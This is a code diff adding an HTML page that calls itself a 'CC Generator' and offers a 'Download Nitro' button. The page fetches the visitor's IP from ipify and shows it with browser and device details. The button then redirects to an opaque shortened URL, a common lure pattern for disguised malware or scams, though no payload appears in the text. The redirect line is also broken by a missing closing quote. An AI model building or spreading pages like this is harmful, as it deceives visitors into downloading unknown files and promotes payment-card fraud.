@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CC Generator</title>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
+        .info { background: #f0f0f0; padding: 15px; border-radius: 5px; margin: 20px 0; }
+        button { background: #5865F2; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>CC Generator(V.1.2)</h1>
+    <div id="userInfo" class="info">
+        <h3>Your System Information:</h3>
+        <p>Loading your device info...</p>
+    </div>
+    <button onclick="download()">Download Nitro</button>
+
+    <script>
+        // Display user information
+        function showUserInfo() {
+            const ip = sessionStorage.getItem('userIP') || 'Unknown';
+            const browser = navigator.userAgent;
+            const platform = navigator.platform;
+            const time = new Date().toLocaleString();
+            
+            document.getElementById('userInfo').innerHTML = `
+                <h3>Your System Information:</h3>
+                <p><strong>IP:</strong> ${ip}</p>
+                <p><strong>Browser:</strong> ${browser}</p>
+                <p><strong>Device:</strong> ${platform}</p>
+                <p><strong>Time:</strong> ${time}</p>
+                <p><em>This information is only visible to you and is not stored.</em></p>
+            `;
+        }
+
+        // Get IP address (client-side only)
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                sessionStorage.setItem('userIP', data.ip);
+                showUserInfo();
+            });
+
+        function download() {
+            alert("Downloading File...");
+            window.location.href = "https://shorturl.at/1phin
+        }
+
+        showUserInfo();
+    </script>
+</body>
+</html>
